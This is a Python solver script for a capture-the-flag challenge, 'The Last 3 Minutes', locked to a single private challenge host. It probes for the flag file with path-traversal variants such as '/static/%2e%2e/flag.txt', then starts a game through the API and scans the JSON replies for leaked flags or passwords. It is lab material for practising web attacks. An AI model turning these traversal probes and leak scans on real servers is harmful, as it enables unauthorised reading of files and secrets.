#!/usr/bin/env python3
"""One-command same-origin flag extractor for The Last 3 Minutes.

Usage::

    python tools/last3_oneclick.py

Only the challenge origin is accepted.  The script checks the exact file and
path variants that could expose the Docker-injected ``flag.txt``, then starts a
game and scans every JSON response for a leaked flag or password.  It does not
contact any other host.  A failure is reported clearly because the supplied
source does not expose a password or an arbitrary-file route.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request


FLAG = re.compile(r"FLAG\{[^\r\n{}]{1,512}\}")
DEFAULT_URL = "http://172.16.91.2:8080"
ALLOWED_HOST = "172.16.91.2"


class Target:
    def __init__(self, base: str, timeout: float):
        parsed = urllib.parse.urlsplit(base)
        if parsed.scheme not in {"http", "https"} or parsed.hostname != ALLOWED_HOST:
            raise ValueError(f"refusing non-challenge host: {base}")
        self.base = base.rstrip("/")
        self.timeout = timeout
        # urllib does not consistently honor CIDR entries in NO_PROXY.  Use a
        # direct opener so the approved private challenge endpoint is reached.
        self.opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))

    def call(self, path: str, method: str = "GET", value: object | None = None) -> tuple[int, bytes]:
        body = None
        headers = {}
        if value is not None:
            body = json.dumps(value, separators=(",", ":")).encode()
            headers["Content-Type"] = "application/json"
        request = urllib.request.Request(self.base + path, data=body, headers=headers, method=method)
        try:
            with self.opener.open(request, timeout=self.timeout) as response:
                return response.status, response.read()
        except urllib.error.HTTPError as error:
            return error.code, error.read()


def flag_in(data: bytes) -> str | None:
    found = FLAG.search(data.decode("utf-8", "replace"))
    return found.group(0) if found else None


def scan_json(data: bytes) -> tuple[str | None, str | None]:
    flag = flag_in(data)
    if flag:
        return flag, None
    try:
        parsed = json.loads(data)
    except (ValueError, UnicodeDecodeError):
        return None, None
    # Keep this generic so a future accidental password field is usable.
    password = None
    if isinstance(parsed, dict):
        for key in ("password", "code", "safe_password"):
            candidate = parsed.get(key)
            if isinstance(candidate, str) and re.fullmatch(r"[0-9a-fA-F]{16}", candidate):
                password = candidate
                break
    return None, password


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default=DEFAULT_URL)
    parser.add_argument("--timeout", type=float, default=5.0)
    args = parser.parse_args()
    try:
        target = Target(args.url, args.timeout)
    except ValueError as exc:
        parser.error(str(exc))

    # These remain same-origin requests; encoded traversal is preserved in the
    # path so the web server, rather than urllib, performs normalization.
    paths = (
        "/flag.txt", "/flag", "/answers/flag", "/app/flag.txt",
        "/static/flag.txt", "/static/../flag.txt",
        "/static/%2e%2e/flag.txt", "/%2e%2e/flag.txt",
        "/static//../flag.txt", "//flag.txt",
    )
    for path in paths:
        try:
            status, data = target.call(path)
        except (urllib.error.URLError, OSError) as exc:
            print(f"target unavailable while requesting {path}: {exc}", file=sys.stderr)
            return 2
        candidate = flag_in(data)
        print(f"{status:3} {path}")
        if candidate:
            print(candidate)
            return 0

    try:
        status, data = target.call("/api/reset", "POST")
    except (urllib.error.URLError, OSError) as exc:
        print(f"target unavailable while resetting: {exc}", file=sys.stderr)
        return 2
    print(f"{status:3} POST /api/reset")
    flag, password = scan_json(data)
    if flag:
        print(flag)
        return 0
    if status != 201:
        print("reset did not create a game", file=sys.stderr)
        return 1
    try:
        state = json.loads(data)
        game_id = state["game_id"]
    except (ValueError, KeyError, TypeError):
        print("reset response did not contain a game id", file=sys.stderr)
        return 1
    if password:
        print(f"password leak: {password}")
        print("Use that value with /api/game/<game_id>/safe after opening the doors.")

    status, data = target.call(f"/api/game/{urllib.parse.quote(game_id, safe='')}")
    print(f"{status:3} GET /api/game/{game_id}")
    flag, password = scan_json(data)
    if flag:
        print(flag)
        return 0
    if password:
        print(f"password leak: {password}")
        return 0

    print("No flag or password was disclosed by the target.", file=sys.stderr)
    print("The supplied app.py has no arbitrary-file route and omits the random password from every public response.", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
